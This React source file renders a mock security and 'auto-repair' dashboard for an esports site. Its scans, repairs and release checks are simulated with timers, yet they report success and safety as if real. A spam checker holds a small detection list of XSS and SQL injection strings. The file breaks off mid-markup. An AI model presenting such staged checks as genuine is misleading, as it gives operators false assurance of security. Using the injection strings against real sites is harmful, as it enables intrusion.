import React, { useState, useEffect, useRef } from "react";
import { motion, AnimatePresence } from "motion/react";
import {
  Shield, ShieldCheck, ShieldAlert, Cpu, RefreshCw, AlertTriangle, Play,
  Download, Upload, CheckCircle2, XCircle, Trash2, Key, Star, Terminal,
  Send, Server, Database, Bug, Activity, Check, ToggleLeft, ToggleRight,
  Sliders, Lock, Info, AlertOctagon, HelpCircle, FileCheck, FileWarning,
  Eye, Search, Monitor, Smartphone, Tablet, Laptop, Sparkles, Filter,
  ChevronRight, ShieldOff, Gauge, Flame, Zap
} from "lucide-react";

// Interface Definitions
interface DiagnosticIssue {
  id: string;
  timestamp: string;
  feature: "Chat" | "Scrims" | "Tournaments" | "Database" | "Layout" | "Assets" | "Auth";
  errorType: string;
  issue: string;
  severity: "low" | "medium" | "high" | "critical";
  status: "detected" | "repairing" | "resolved" | "manual";
  suggestedSolution: string;
  adminActions?: string;
}

interface ThreatAlert {
  id: string;
  source: string;
  type: string;
  severity: "high" | "critical";
  status: "blocked" | "quarantined" | "challenged" | "flagged";
  time: string;
}

interface ResponsiveStatus {
  device: string;
  width: string;
  croppedContent: boolean;
  overlappingElements: boolean;
  hiddenButtons: boolean;
  horizontalScrolling: boolean;
  misalignedText: boolean;
  overallStatus: "Optimal" | "Action Required" | "Repaired";
}

export default function CVSecurityGuardian() {
  // Navigation Tabs matching custom requirements
  const [activeTab, setActiveTab] = useState<"dashboard" | "scans" | "responsive" | "prepublish" | "security" | "logs">("dashboard");

  // Global Alerts Banner state
  const [systemAlertMessage, setSystemAlertMessage] = useState<string | null>(null);

  // 1. Dashboard Filter States
  const [filterSeverity, setFilterSeverity] = useState<"all" | "low" | "medium" | "high" | "critical">("all");
  const [filterFeature, setFilterFeature] = useState<"all" | "Chat" | "Scrims" | "Database" | "Layout" | "Assets" | "Auth">("all");
  const [searchLogQuery, setSearchLogQuery] = useState<string>("");

  // Real-time Telemetry state variables (simulated auto-update loop)
  const [serverLoad, setServerLoad] = useState(24);
  const [memoryUsage, setMemoryUsage] = useState(312);
  const [apiLatency, setApiLatency] = useState(22);
  const [activeUsers, setActiveUsers] = useState(48);
  const [uptimeSeconds, setUptimeSeconds] = useState(1572480);

  // General counts (reactive based on actions)
  const [overallHealth, setOverallHealth] = useState(96);
  const [securityScore, setSecurityScore] = useState(98);
  const [autoHealedCount, setAutoHealedCount] = useState(142);
  const [awaitingReviewCount, setAwaitingReviewCount] = useState(2);
  const [securityWarningsCount, setSecurityWarningsCount] = useState(3);
  const [performanceScore, setPerformanceScore] = useState(94);

  // Live Overrides & System Logs buffer
  const [liveTerminalLogs, setLiveTerminalLogs] = useState<string[]>([
    `[${new Date().toLocaleTimeString()}] 🛡️ Sentinel auto-repair listener bound: 0.0.0.0`,
    `[${new Date().toLocaleTimeString()}] 🟢 Core health telemetry scan passed (96% stable)`,
    `[${new Date().toLocaleTimeString()}] ⚙️ Multi-Engine virus scan quarantine directory loaded`,
    `[${new Date().toLocaleTimeString()}] 🤖 Auto-Fix engine resolved: Pruned 14 cached layout redundant files`
  ]);

  // Master Diagnostics Issues Database
  const [issues, setIssues] = useState<DiagnosticIssue[]>([
    {
      id: "ERR-201",
      timestamp: "Today, 08:34 AM UTC",
      feature: "Chat",
      errorType: "Socket Handshake Error",
      issue: "Repetitive burst disconnects on Web-Socket channel #TDM-Lobby",
      severity: "high",
      status: "detected",
      suggestedSolution: "Reinforce heartbeat timers, flush idle connections, and clear buffer caches",
      adminActions: "None taken yet"
    },
    {
      id: "ERR-202",
      timestamp: "Today, 08:15 AM UTC",
      feature: "Assets",
      errorType: "Missing Image Resource",
      issue: "404 on background tactical banner assets in Sanhok maps overlay",
      severity: "medium",
      status: "detected",
      suggestedSolution: "Inject high-resolution default tactical layout placeholder on failover",
      adminActions: "None taken yet"
    },
    {
      id: "ERR-203",
      timestamp: "Today, 07:44 AM UTC",
      feature: "Database",
      errorType: "Lock Contention timeout",
      issue: "Write lock wait timeout exceeded on dual waitlist join pool write transactions",
      severity: "critical",
      status: "resolved",
      suggestedSolution: "Re-queue waitlist write updates with randomized exponential backoff retry algorithms",
      adminActions: "Repaired via lock pooling bypass script"
    },
    {
      id: "ERR-204",
      timestamp: "Today, 06:12 AM UTC",
      feature: "Layout",
      errorType: "Horizontal Scroll Drift",
      issue: "Cropped viewport padding drift in Mobile-XS widths during match results overview",
      severity: "low",
      status: "resolved",
      suggestedSolution: "Enforce max-w-full and overflow-x-hidden attributes on the outer wrapper parent container",
      adminActions: "Applied inline overflow containment rules"
    },
    {
      id: "ERR-205",
      timestamp: "Yesterday, 11:22 PM UTC",
      feature: "Tournaments",
      errorType: "Stale Bracket API Fetch",
      issue: "Stale bracket synchronization response cache on external API mirror",
      severity: "medium",
      status: "manual",
      suggestedSolution: "Requires manual review of upstream JSON payload endpoints or bypass token reissue",
      adminActions: "Logged for dev inspection"
    }
  ]);

  // Security Intercepts
  const [threats, setThreats] = useState<ThreatAlert[]>([
    { id: "SEC-401", source: "185.190.140.23", type: "Brute-force credential stuffing attempt on leaderboards endpoint", severity: "high", status: "blocked", time: "3m ago" },
    { id: "SEC-402", source: "ToxicScout_IGL", type: "XSS Cross-Site script injection payload detected in global arena chat", severity: "critical", status: "challenged", time: "11m ago" },
    { id: "SEC-403", source: "103.44.112.5", type: "SQL Injection query tokens (' OR '1'='1) detected in team sign-up form", severity: "critical", status: "blocked", time: "28m ago" },
    { id: "SEC-404", source: "88.243.19.124", type: "Rate limit threshold breached (45 requests/sec from individual host)", severity: "high", status: "quarantined", time: "42m ago" }
  ]);

  // Anti-Spam / Malicious Chat Tester state
  const [spamInput, setSpamInput] = useState("");
  const [spamResult, setSpamResult] = useState<{ isSpam: boolean; confidence: number; trigger: string } | null>(null);

  // Multi-engine Isolation File upload scanner
  const [scannedFiles, setScannedFiles] = useState<Array<{ name: string; size: string; status: "clean" | "isolated"; detection?: string }>>([
    { name: "cv_zimbabwe_banner_logo.png", size: "1.2 MB", status: "clean" },
    { name: "scrim_cheat_wallhack_injector.bat", size: "4 KB", status: "isolated", detection: "Heur.Trojan.CheatInject" }
  ]);
  const [isFileScanning, setIsFileScanning] = useState(false);

  // 2. Interactive Website Scanner States
  const [scanProgress, setScanProgress] = useState(0);
  const [isScanning, setIsScanning] = useState(false);
  const [scannedMetrics, setScannedMetrics] = useState({
    pagesChecked: 0,
    linksChecked: 0,
    assetsChecked: 0,
    formsChecked: 0
  });
  const [detectedScanAnomalies, setDetectedScanAnomalies] = useState<Array<{ name: string; type: string; severity: "low" | "medium" | "high"; status: "detected" | "repairing" | "repaired" }>>([]);

  // 3. Responsive Verification States
  const [isRepairingLayout, setIsRepairingLayout] = useState(false);
  const [responsiveDevices, setResponsiveDevices] = useState<ResponsiveStatus[]>([
    { device: "Mobile Phone (iPhone / Android)", width: "390px - 430px", croppedContent: false, overlappingElements: true, hiddenButtons: false, horizontalScrolling: true, misalignedText: false, overallStatus: "Action Required" },
    { device: "Tablet (iPad / Surface)", width: "768px - 1024px", croppedContent: false, overlappingElements: false, hiddenButtons: false, horizontalScrolling: false, misalignedText: false, overallStatus: "Optimal" },
    { device: "Laptop (MacBook Air / XPS 13)", width: "1280px - 1440px", croppedContent: false, overlappingElements: false, hiddenButtons: false, horizontalScrolling: false, misalignedText: false, overallStatus: "Optimal" },
    { device: "Desktop PC (FHD Pro Gaming)", width: "1920px", croppedContent: false, overlappingElements: false, hiddenButtons: false, horizontalScrolling: false, misalignedText: false, overallStatus: "Optimal" },
    { device: "Ultra-Wide Monitor (Esports Stage)", width: "2560px - 3440px", croppedContent: true, overlappingElements: false, hiddenButtons: false, horizontalScrolling: false, misalignedText: true, overallStatus: "Action Required" }
  ]);

  // 4. Pre-Publish Validation States
  const [prePublishStatus, setPrePublishStatus] = useState<"idle" | "running" | "passed" | "blocked">("idle");
  const [prePublishProgress, setPrePublishProgress] = useState(0);
  const [prePublishChecklist, setPrePublishChecklist] = useState([
    { name: "Verification that every page loads with zero timeouts", checked: false, mandatory: true },
    { name: "Interactive button elements cursor event handlers validated", checked: false, mandatory: true },
    { name: "Registration & Login forms submission logic verification", checked: false, mandatory: true },
    { name: "Smooth frame rate transition animations & motion checks", checked: false, mandatory: false },
    { name: "Tactical strategy maps & asset image load integrity check", checked: false, mandatory: true },
    { name: "Internal navigation links relative path routing compliance", checked: false, mandatory: true },
    { name: "Console log warning filter / zero critical React warnings check", checked: false, mandatory: false }
  ]);

  // Continuous Telemetry Fluctuations simulation
  useEffect(() => {
    const timer = setInterval(() => {
      // Simulate real-time server telemetry drift
      setServerLoad(prev => {
        const delta = Math.floor(Math.random() * 7) - 3;
        return Math.max(12, Math.min(68, prev + delta));
      });
      setMemoryUsage(prev => {
        const delta = Math.floor(Math.random() * 11) - 5;
        return Math.max(280, Math.min(420, prev + delta));
      });
      setApiLatency(prev => {
        const delta = Math.floor(Math.random() * 5) - 2;
        return Math.max(14, Math.min(48, prev + delta));
      });
      setActiveUsers(prev => {
        const delta = Math.floor(Math.random() * 3) - 1;
        return Math.max(38, Math.min(64, prev + delta));
      });
      setUptimeSeconds(prev => prev + 1);
    }, 3000);

    return () => clearInterval(timer);
  }, []);

  // Format uptime helpers
  const formatUptime = (totalSeconds: number) => {
    const days = Math.floor(totalSeconds / (3600 * 24));
    const hours = Math.floor((totalSeconds % (3600 * 24)) / 3600);
    const minutes = Math.floor((totalSeconds % 3600) / 60);
    const secs = totalSeconds % 60;
    return `${days}d ${hours}h ${minutes}m ${secs}s`;
  };

  const addLog = (text: string) => {
    const stamp = `[${new Date().toLocaleTimeString()}]`;
    setLiveTerminalLogs(prev => [`${stamp} ${text}`, ...prev.slice(0, 30)]);
  };

  // Trigger self-healing scripts for specific issues
  const triggerSingleHealer = (id: string) => {
    setIssues(prev => prev.map(issue => {
      if (issue.id === id) {
        addLog(`🔧 Dispatching self-repair module on '${issue.feature}': ${issue.errorType}...`);
        return { ...issue, status: "repairing" };
      }
      return issue;
    }));

    setTimeout(() => {
      setIssues(prev => prev.map(issue => {
        if (issue.id === id) {
          addLog(`✅ Auto-Repair SUCCESS: Restored file index parity & patched configuration anomalies on '${issue.feature}'!`);
          setAutoHealedCount(prevCount => prevCount + 1);
          setOverallHealth(prevH => Math.min(100, prevH + 1));
          return { ...issue, status: "resolved", adminActions: "Repaired via autonomous script bypass" };
        }
        return issue;
      }));
      setSystemAlertMessage(`Successfully repaired ${id} anomaly! System score optimized.`);
    }, 1800);
  };

  // MASS AUTONOMOUS SELF-HEAL
  const triggerMassAutoHeal = () => {
    addLog(`🚨 INITIATING MASS AUTONOMOUS REPAIR SYSTEM...`);
    setIssues(prev => prev.map(issue => {
      if (issue.status === "detected") {
        return { ...issue, status: "repairing" };
      }
      return issue;
    }));

    setTimeout(() => {
      setIssues(prev => prev.map(issue => {
        if (issue.status === "repairing") {
          return { ...issue, status: "resolved", adminActions: "Repaired via master auto-fix bypass" };
        }
        return issue;
      }));
      setAutoHealedCount(prevCount => prevCount + 2);
      setOverallHealth(100);
      setPerformanceScore(99);
      addLog(`✨ SUCCESS: Autonomous healing sweep completed successfully on all repairable layers.`);
      setSystemAlertMessage("✓ Automatic healer sweep completed! Website stability optimization maximized.");
    }, 2000);
  };

  // Website scanner simulator
  const startFullWebsiteScan = () => {
    setIsScanning(true);
    setScanProgress(5);
    setDetectedScanAnomalies([]);
    addLog(`🔍 Starting 360-degree automatic website scan...`);
    
    let currentPrg = 5;
    const interval = setInterval(() => {
      currentPrg += 15;
      if (currentPrg >= 100) {
        currentPrg = 100;
        clearInterval(interval);
        setIsScanning(false);
        // Inject final scanned results
        setScannedMetrics({
          pagesChecked: 14,
          linksChecked: 112,
          assetsChecked: 74,
          formsChecked: 8
        });
        setDetectedScanAnomalies([
          { name: "Sanhok Map tactical background image drift", type: "Missing/Stretched Asset", severity: "medium", status: "detected" },
          { name: "Mobile layout overlapping menu buttons in XS-width", type: "Responsive display constraints", severity: "high", status: "detected" },
          { name: "Double click delay on tournament signup register actions", type: "Animation/Interaction latency", severity: "low", status: "detected" }
        ]);
        addLog(`🎯 Website Scan finished: Detected 3 minor anomalies. Report compiled and stored in logs.`);
        setSystemAlertMessage("✓ Website Scan finished! 3 repairable issues identified.");
      }
      setScanProgress(currentPrg);
      
      // Add incremental logs during scan
      if (currentPrg === 20) addLog("🔍 Scan Step 1/5: Checking core routing endpoints & relative navigation schemas...");
      if (currentPrg === 50) addLog("🔍 Scan Step 2/5: Reviewing media asset folders, font files, and icons packages...");
      if (currentPrg === 65) addLog("🔍 Scan Step 3/5: Running validation forms submission & click-event handler tests...");
      if (currentPrg === 85) addLog("🔍 Scan Step 4/5: Running vulnerability analysis against database injection tokens...");
    }, 400);
  };

  // Run Auto-repair on Scanned anomalies
  const autoRepairScannedIssue = (index: number) => {
    setDetectedScanAnomalies(prev => prev.map((anom, idx) => {
      if (idx === index) {
        addLog(`⚙️ Autonomous Repair System: Re-configuring file assets & adjusting viewport layout settings for '${anom.name}'...`);
        return { ...anom, status: "repairing" };
      }
      return anom;
    }));

    setTimeout(() => {
      setDetectedScanAnomalies(prev => prev.map((anom, idx) => {
        if (idx === index) {
          addLog(`✅ Successfully patched and resolved layout constraints for '${anom.name}'!`);
          setAutoHealedCount(prevCount => prevCount + 1);
          return { ...anom, status: "repaired" };
        }
        return anom;
      }));
    }, 1500);
  };

  // Layout repairs simulator
  const runResponsiveLayoutRepair = () => {
    setIsRepairingLayout(true);
    addLog("📱 Mobilizing layout self-repair scripts. Enforcing responsive tailwind grid limits...");

    setTimeout(() => {
      setResponsiveDevices(prev => prev.map(dev => {
        if (dev.overallStatus === "Action Required") {
          return {
            ...dev,
            croppedContent: false,
            overlappingElements: false,
            hiddenButtons: false,
            horizontalScrolling: false,
            misalignedText: false,
            overallStatus: "Repaired"
          };
        }
        return dev;
      }));
      setIsRepairingLayout(false);
      setAutoHealedCount(prevCount => prevCount + 2);
      addLog("✅ Responsive optimization sweep complete! Verified across Mobile, Tablet, Laptop, and Ultrawide displays.");
      setSystemAlertMessage("✓ All responsive viewport layout issues successfully resolved!");
    }, 2000);
  };

  // Pre-Publish deployment validator
  const runPrePublishSuite = () => {
    setPrePublishStatus("running");
    setPrePublishProgress(10);
    addLog("🧪 Launching Pre-Publish Deployment Gatekeeper check...");

    let currentPrg = 10;
    const interval = setInterval(() => {
      currentPrg += 20;
      if (currentPrg >= 100) {
        currentPrg = 100;
        clearInterval(interval);
        
        // Mark all checks verified
        setPrePublishChecklist(prev => prev.map(chk => ({ ...chk, checked: true })));
        
        // If there are outstanding detected/high severity issues, we'd block it.
        const hasUnresolvedCriticals = issues.some(iss => iss.status === "detected" && iss.severity === "critical");
        if (hasUnresolvedCriticals) {
          setPrePublishStatus("blocked");
          addLog("❌ DEPLOYMENT BLOCKED: Critical un-repaired anomalies remain in database transaction pools. Fix before publishing.");
          setSystemAlertMessage("⚠️ Release blocked! Critical database write lock issues must be resolved first.");
        } else {
          setPrePublishStatus("passed");
          addLog("🚀 RELEASE PERMITTED: All mandatory gatekeeper validation scripts have passed successfully with 0 errors!");
          setSystemAlertMessage("✓ Pre-publish checks successful! Platform is safe to release.");
        }
      }
      setPrePublishProgress(currentPrg);
    }, 350);
  };

  // Anti-spam scan check
  const handleSpamLabCheck = () => {
    const text = spamInput.trim();
    if (!text) return;

    let score = 0;
    let triggerWords: string[] = [];

    const upperRatio = (text.match(/[A-Z]/g) || []).length / text.length;
    if (upperRatio > 0.65 && text.length > 10) {
      score += 45;
      triggerWords.push("CAPS overload");
    }

    if (text.includes("<script>") || text.includes("SELECT *") || text.includes("' OR '1'='1")) {
      score += 95;
      triggerWords.push("Malicious injection token/XSS string");
    }

    if (text.toLowerCase().includes("free coins") || text.toLowerCase().includes("cheat") || text.toLowerCase().includes("hack")) {
      score += 70;
      triggerWords.push("Spam keyword triggers");
    }

    const isSpam = score >= 40;
    setSpamResult({
      isSpam,
      confidence: score,
      trigger: triggerWords.length > 0 ? triggerWords.join(", ") : "No high-risk triggers matched"
    });

    if (isSpam) {
      addLog(`🚨 Spam Lab Intercept: Flagged content for malicious tokens. Confidence: ${score}%`);
    } else {
      addLog(`🟢 Spam Lab Clear: Mock message complied with global text parameters.`);
    }
  };

  // Isolation uploader test
  const simulateFileUploadScan = (isMalicious: boolean) => {
    setIsFileScanning(true);
    addLog(`📤 Loading test asset file into validation sandbox...`);

    setTimeout(() => {
      setIsFileScanning(false);
      if (isMalicious) {
        setScannedFiles(prev => [
          { name: "tourney_key_generator_hacks.exe", size: "320 KB", status: "isolated", detection: "W32.Exploit.Hacktool" },
          ...prev
        ]);
        setSecurityScore(prev => Math.max(70, prev - 3));
        setSecurityWarningsCount(prev => prev + 1);
        addLog(`🚨 WARNING SEC-FIREWALL: Quarantined 'tourney_key_generator_hacks.exe' inside isolation storage! Heuristics matched.`);
      } else {
        setScannedFiles(prev => [
          { name: "team_avatar_zimbabwe.png", size: "840 KB", status: "clean" },
          ...prev
        ]);
        addLog(`✓ Scan cleared: 'team_avatar_zimbabwe.png' validated safe by 12 heuristic engines.`);
      }
    }, 1500);
  };

  // Dynamic Filtering for logs
  const filteredIssues = issues.filter(iss => {
    const severityMatch = filterSeverity === "all" || iss.severity === filterSeverity;
    const featureMatch = filterFeature === "all" || iss.feature === filterFeature;
    const query = searchLogQuery.toLowerCase();
    const textMatch = !query || 
      iss.id.toLowerCase().includes(query) ||
      iss.issue.toLowerCase().includes(query) ||
      iss.errorType.toLowerCase().includes(query) ||
      iss.suggestedSolution.toLowerCase().includes(query);

    return severityMatch && featureMatch && textMatch;
  });

  return (
    <div className="space-y-6 text-left">
      
      {/* ALERTS NOTIFICATION BANNER */}
      <AnimatePresence>
        {systemAlertMessage && (
          <motion.div
            initial={{ opacity: 0, y: -15 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -15 }}
            className="bg-red-950/90 border border-red-500/40 text-red-200 px-5 py-3 rounded-2xl flex items-center justify-between gap-4 shadow-[0_0_15px_rgba(239,68,68,0.15)] relative z-50 font-mono text-xs"
          >
            <div className="flex items-center gap-2.5">
              <span className="w-2 h-2 bg-red-500 rounded-full animate-pulse" />
              <span>{systemAlertMessage}</span>
            </div>
            <button
              onClick={() => setSystemAlertMessage(null)}
              className="text-red-400 hover:text-white uppercase font-black text-[10px] tracking-wider transition-all"
            >
              [Dismiss]
            </button>
          </motion.div>
        )}
      </AnimatePresence>

      {/* CORE CONTROL HUD HEADER */}
      <div className="bg-[#0b0c10]/95 border border-red-550/20 p-6 rounded-3xl relative overflow-hidden space-y-4">
        <div className="absolute inset-0 bg-[radial-gradient(circle_at_80%_20%,rgba(239,68,68,0.07),transparent_70%)] pointer-events-none" />
        
        <div className="flex flex-col xl:flex-row xl:items-center justify-between gap-6 relative z-10">
          <div className="space-y-1">
            <div className="inline-flex items-center gap-1.5 px-3 py-1 bg-red-950/40 border border-red-500/20 rounded-full font-mono text-[9px] text-red-400 font-bold tracking-widest uppercase">
              🛡️ CV-Shield Self-Healer Daemon
            </div>
            <h1 className="text-2xl font-black font-mono tracking-tight text-white uppercase flex items-center gap-2.5">
              FEAR 4FANGZ <span className="text-red-550">AUTO-REPAIR SUITE</span>
            </h1>
            <p className="text-xs text-zinc-400 max-w-2xl font-sans leading-relaxed">
              Autonomous self-repair, multi-resolution page validator, security firewalls, spam analyzer, and pre-publish CI/CD gatekeepers monitoring esports databases around the clock.
            </p>
          </div>
          
          {/* STATS DECK */}
          <div className="flex flex-wrap gap-2.5 font-mono text-xs">
            <div className="px-4 py-2 bg-black/80 border border-zinc-900 rounded-xl min-w-[120px] shadow-inner">
              <span className="text-zinc-500 block text-[8px] uppercase font-bold">Total Issues</span>
              <strong className="text-white text-base font-black">{issues.length}</strong>
            </div>

            <div className="px-4 py-2 bg-black/80 border border-zinc-900 rounded-xl min-w-[120px] shadow-inner">
              <span className="text-emerald-500 block text-[8px] uppercase font-bold flex items-center gap-1">
                <Sparkles size={8} className="animate-pulse" /> Auto-Healed
              </span>
              <strong className="text-emerald-400 text-base font-black">{autoHealedCount}</strong>
            </div>

            <div className="px-4 py-2 bg-black/80 border border-zinc-900 rounded-xl min-w-[120px] shadow-inner">
              <span className="text-amber-500 block text-[8px] uppercase font-bold">Awaiting Review</span>
              <strong className="text-amber-500 text-base font-black">{issues.filter(i => i.status === "detected" || i.status === "manual").length}</strong>
            </div>

            <div className="px-4 py-2 bg-black/80 border border-zinc-900 rounded-xl min-w-[120px] shadow-inner">
              <span className="text-red-500 block text-[8px] uppercase font-bold">Firewall Intercepts</span>
              <strong className="text-red-500 text-base font-black">{threats.length}</strong>
            </div>
          </div>
        </div>

        {/* METRIC GRAPHS ROW */}
        <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-5 gap-3 pt-3 border-t border-zinc-900">
          <div className="bg-black/40 p-2.5 rounded-xl border border-zinc-900 flex items-center justify-between">
            <div>
              <span className="text-[8.5px] text-zinc-500 block uppercase font-mono">Server Load</span>
              <span className="text-xs font-black text-white font-mono">{serverLoad}%</span>
            </div>
            <div className="h-6 w-12 bg-red-950/20 rounded flex items-end gap-0.5 px-1 overflow-hidden shrink-0">
              <div className="bg-red-550 w-full" style={{ height: "40%" }} />
              <div className="bg-red-550 w-full" style={{ height: "60%" }} />
              <div className="bg-red-550 w-full animate-pulse" style={{ height: `${serverLoad}%` }} />
            </div>
          </div>

          <div className="bg-black/40 p-2.5 rounded-xl border border-zinc-900 flex items-center justify-between">
            <div>
              <span className="text-[8.5px] text-zinc-500 block uppercase font-mono">Memory Usage</span>
              <span className="text-xs font-black text-blue-400 font-mono">{memoryUsage} MB</span>
            </div>
            <div className="h-6 w-12 bg-blue-950/20 rounded flex items-end gap-0.5 px-1 overflow-hidden shrink-0">
              <div className="bg-blue-400 w-full" style={{ height: "50%" }} />
              <div className="bg-blue-400 w-full" style={{ height: "40%" }} />
              <div className="bg-blue-400 w-full animate-pulse" style={{ height: `${(memoryUsage / 420) * 100}%` }} />
            </div>
          </div>

          <div className="bg-black/40 p-2.5 rounded-xl border border-zinc-900 flex items-center justify-between">
            <div>
              <span className="text-[8.5px] text-zinc-500 block uppercase font-mono">API Latency</span>
              <span className="text-xs font-black text-emerald-400 font-mono">{apiLatency} ms</span>
            </div>
            <div className="h-6 w-12 bg-emerald-950/20 rounded flex items-end gap-0.5 px-1 overflow-hidden shrink-0">
              <div className="bg-emerald-400 w-full" style={{ height: "30%" }} />
              <div className="bg-emerald-400 w-full" style={{ height: "20%" }} />
              <div className="bg-emerald-400 w-full animate-pulse" style={{ height: `${(apiLatency / 48) * 100}%` }} />
            </div>
          </div>

          <div className="bg-black/40 p-2.5 rounded-xl border border-zinc-900 flex items-center justify-between">
            <div>
              <span className="text-[8.5px] text-zinc-500 block uppercase font-mono">Active Users</span>
              <span className="text-xs font-black text-amber-500 font-mono">{activeUsers} online</span>
            </div>
            <div className="h-6 w-12 bg-amber-950/20 rounded flex items-end gap-0.5 px-1 overflow-hidden shrink-0">
              <div className="bg-amber-400 w-full" style={{ height: "70%" }} />
              <div className="bg-amber-400 w-full animate-pulse" style={{ height: "80%" }} />
              <div className="bg-amber-400 w-full" style={{ height: "75%" }} />
            </div>
          </div>

          <div className="bg-black/40 p-2.5 rounded-xl border border-zinc-900 hidden lg:flex items-center justify-between">
            <div>
              <span className="text-[8.5px] text-zinc-500 block uppercase font-mono">System Integrity</span>
              <span className="text-xs font-black text-white font-mono">{overallHealth}%</span>
            </div>
            <span className="px-2 py-0.5 bg-emerald-950 text-emerald-400 rounded border border-emerald-900 text-[8px] font-black uppercase tracking-widest font-mono">
              STABLE
            </span>
          </div>
        </div>

        {/* TAB NAVIGATION DECK */}
        <div className="flex flex-wrap gap-1.5 bg-zinc-950 p-1.5 rounded-xl border border-zinc-900">
          {[
            { id: "dashboard", label: "📊 Error Dashboard & Audit", desc: "Overview & diagnostic charts" },
            { id: "scans", label: "🔍 Continuous Scan & Repair", desc: "Run deep automatic diagnostics" },
            { id: "responsive", label: "📱 Responsive Validation", desc: "Cross-device layouts validator" },
            { id: "prepublish", label: "🧪 Pre-Publish Gatekeeper", desc: "CI/CD check before updates" },
            { id: "security", label: "🔒 Firewall & Threat Shield", desc: "Blocked IPs, spam labs & quarantine" },
            { id: "logs", label: "📝 Detailed Log Ledger", desc: "Auditable issues database" }
          ].map(tab => (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id as any)}
              className={`flex-1 text-center py-2 px-3 rounded-lg text-xs font-black transition-all duration-150 uppercase tracking-wider cursor-pointer ${
                activeTab === tab.id
                  ? "bg-red-955/40 border border-red-500/35 text-white shadow-md shadow-red-950/20 scale-[1.01]"
                  : "bg-transparent border border-transparent text-zinc-400 hover:text-white hover:bg-zinc-900/40"
              }`}
            >
              <div className="font-bold text-[10px] tracking-wider">{tab.label}</div>
              <div className="text-[7.5px] font-normal font-sans tracking-tight text-zinc-500 lowercase mt-0.5">{tab.desc}</div>
            </button>
          ))}
        </div>
      </div>

      {/* THREE-COLUMN LAYOUT ZONE */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">

        {/* WORKSPACE MIDDLE (TABS WORKSPACE) */}
        <div className="lg:col-span-8 space-y-6">
          <AnimatePresence mode="wait">
            
            {/* 1. ERROR DASHBOARD TAB */}
            {activeTab === "dashboard" && (
              <motion.div
                key="dashboard-tab"
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -10 }}
                className="space-y-6"
              >
                {/* System Control Panel */}
                <div className="bg-zinc-950 p-5 rounded-2xl border border-zinc-900 flex flex-col md:flex-row items-start md:items-center justify-between gap-4">
                  <div className="space-y-1">
                    <h4 className="text-xs font-black text-white uppercase tracking-widest flex items-center gap-1.5">
                      <Gauge size={14} className="text-red-500" />
                      Automatic Telemetry Operations
                    </h4>
                    <p className="text-[11px] text-zinc-400 font-sans leading-normal">
                      The Sentinel Shield detects layout anomalies, broken linkages, server load timeouts and fixes simple errors on-the-fly.
                    </p>
                  </div>
                  <button
                    onClick={triggerMassAutoHeal}
                    className="px-4 py-2.5 bg-red-650 hover:bg-red-700 font-mono text-white text-[10px] font-black uppercase tracking-wider rounded-lg shrink-0 flex items-center gap-1.5 shadow-lg shadow-red-950/40 duration-100 cursor-pointer"
                  >
                    <RefreshCw size={12} className="animate-spin" />
                    TRIGGER AUTONOMOUS SELF-HEAL SWEEP
                  </button>
                </div>

                {/* Filters Widget */}
                <div className="bg-zinc-950 p-4 rounded-xl border border-zinc-900 grid grid-cols-1 sm:grid-cols-3 gap-3">
                  <div>
                    <label className="text-[9px] text-zinc-500 uppercase font-mono block mb-1">Filter Severity</label>
                    <select
                      value={filterSeverity}
                      onChange={(e) => setFilterSeverity(e.target.value as any)}
                      className="w-full bg-black border border-zinc-850 p-1.5 text-white rounded text-[10.5px] outline-none focus:border-red-500"
                    >
                      <option value="all">All Severities</option>
                      <option value="low">Low Severity</option>
                      <option value="medium">Medium Severity</option>
                      <option value="high">High Severity</option>
                      <option value="critical">Critical Severity</option>
                    </select>
                  </div>

                  <div>
                    <label className="text-[9px] text-zinc-500 uppercase font-mono block mb-1">Filter Feature</label>
                    <select
                      value={filterFeature}
                      onChange={(e) => setFilterFeature(e.target.value as any)}
                      className="w-full bg-black border border-zinc-850 p-1.5 text-white rounded text-[10.5px] outline-none focus:border-red-500"
                    >
                      <option value="all">All Features</option>
                      <option value="Chat">Chat System</option>
                      <option value="Scrims">Scrims System</option>
                      <option value="Tournaments">Tournaments</option>
                      <option value="Database">Database Layer</option>
                      <option value="Layout">Layout / Styling</option>
                      <option value="Assets">Assets Storage</option>
                    </select>
                  </div>

                  <div>
                    <label className="text-[9px] text-zinc-500 uppercase font-mono block mb-1">Search Issues</label>
                    <div className="relative">
                      <input
                        type="text"
                        value={searchLogQuery}
                        onChange={(e) => setSearchLogQuery(e.target.value)}
                        placeholder="Type query to filter..."
                        className="w-full bg-black border border-zinc-850 p-1.5 pl-7 text-white rounded text-[10.5px] outline-none focus:border-red-500 font-mono"
                      />
                      <Search size={10} className="absolute left-2.5 top-2.5 text-zinc-550" />
                    </div>
                  </div>
                </div>

                {/* Dashboard issues feed */}
                <div className="space-y-3">
                  <div className="flex justify-between items-center px-1">
                    <h3 className="text-xs font-black tracking-widest text-zinc-200 uppercase font-mono">
                      🔴 CURRENTLY OBSERVED ANOMALIES
                    </h3>
                    <span className="text-[10px] font-mono text-zinc-500">
                      Showing {filteredIssues.length} of {issues.length} records
                    </span>
                  </div>

                  <div className="space-y-3">
                    {filteredIssues.map(iss => (
                      <div
                        key={iss.id}
                        className="bg-zinc-950 border border-zinc-900 rounded-2xl p-4 flex flex-col md:flex-row md:items-center justify-between gap-4 text-xs font-mono relative overflow-hidden"
                      >
                        <div className="space-y-2 max-w-xl">
                          <div className="flex flex-wrap items-center gap-2">
                            <span className="text-red-550 font-black font-mono">[{iss.id}]</span>
                            <span className={`px-2 py-0.5 rounded text-[8px] font-black uppercase ${
                              iss.severity === "critical" ? "bg-red-950 text-red-400 border border-red-900/60" :
                              iss.severity === "high" ? "bg-orange-95/20 text-orange-400 border border-orange-900/40" :
                              iss.severity === "medium" ? "bg-yellow-95/20 text-yellow-400 border border-yellow-900/30" :
                              "bg-zinc-900 text-zinc-400 border border-zinc-800"
                            }`}>
                              {iss.severity} Severity
                            </span>
                            <span className="px-2 py-0.5 rounded bg-zinc-900 text-zinc-400 border border-zinc-800 text-[8.5px] font-black uppercase">
                              {iss.feature}
                            </span>
                            <span className="text-zinc-500 text-[10px]">{iss.timestamp}</span>
                          </div>

                          <div>
                            <strong className="text-white text-[13px] block">{iss.errorType}</strong>
